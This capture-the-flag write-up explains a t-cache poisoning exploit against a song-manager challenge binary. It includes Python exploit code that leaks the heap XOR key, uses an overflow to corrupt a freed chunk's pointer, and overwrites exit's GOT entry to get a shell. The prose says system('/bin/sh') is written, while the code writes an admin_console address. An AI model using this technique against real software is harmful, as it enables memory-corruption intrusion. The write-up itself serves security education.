# T-Cache Poisoning

## Solution

This challenge allows three simple operations: Allocate a song and set its name (the first eight bytes of the allocated memory), edit a song's lyrics (the rest of its memory), and free the memory of the song. We note that this challenge has a use after free exploit (no checking whether memory was freed after editting) and an overflow when editting a lyric.

Thus, the strategy for this solving this challenge is to poison the t-cache. First, we allocate some memory and then free it, moving all of the allocated chunks into the t-cache. We note that the last element in the t-cache has the value of the key, which every pointer in the linked-list is XORed with. Thus, we need to leak the last element and one other element. We use the edit function to do this (which prints the name of the song).
```python
for i in range(10):
    create(i, chr(ord('A')+i).encode('utf-8')*0xf)
for i in range(10):
    delete(i)

key_leak = edit(0, b'A'*0xf)
key = u64(key_leak + (b'\0' * (8-len(key_leak))))
log.info(f"Key leaked as {hex(key)}")

cipher_leak = edit(1, b'B'*0xf)
addr = u64(cipher_leak + (b'\0' * (8 - len(cipher_leak)))) ^ key
log.info(f"Leaked address: {hex(addr)}")
```
Next, we allocate two pieces of memory, getting them from the t-cache. We then free the second piece, putting it back in the t-cache. We can now utilize the buffer overflow to edit the allocated song and edit the address of the next chunk (which is in the t-cache). We set this address to be the value of `exit` in the `got` XORed with the key. Now, if we allocate two songs, the second one will be located at `exit` in the `got`. So, when we set the song name of this allocation, we point it to a call to `system('/bin/sh')`. This will create the shell:
```python
create(0, b'A')
create(1, b'B')
delete(0)

payload = b'A'*0x78
payload += p64(0x91)
payload += p64(e.got['exit'] ^ key)
edit(1, payload)

create(0, b'A')
create(2, p64(e.symbols['admin_console']))

p.sendlineafter(b'>>>', b'4')
```